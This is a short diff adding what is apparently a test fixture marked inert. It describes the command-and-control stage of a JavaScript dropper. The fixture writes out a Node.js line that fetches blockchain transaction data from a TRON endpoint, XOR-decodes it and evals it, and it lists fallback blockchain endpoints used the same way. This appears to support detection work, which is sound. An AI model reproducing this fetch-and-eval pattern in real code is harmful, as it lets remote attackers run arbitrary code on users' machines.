@@ -1,0 +1,6 @@
+FIXTURE - inert, never executed. The shape of the dropper's C2 stage: a
+blockchain dead-drop endpoint resolved a few hundred characters from the
+eval that runs whatever comes back.
+require('https').get('https://api.trongrid.io/wallet/gettransactionbyid?value=' + h, function (r) { var b = ''; r.on('data', function (c) { b += c }); r.on('end', function () { eval(xor(JSON.parse(b).data, k)) }) });
+Other endpoints the same stage falls back to:
+https://fullnode.mainnet.aptoslabs.com/v1/accounts | https://bsc-dataseed.binance.org/ | https://bsc-rpc.publicnode.com/ | {"method":"eth_getTransactionByHash"} ... then eval(next)
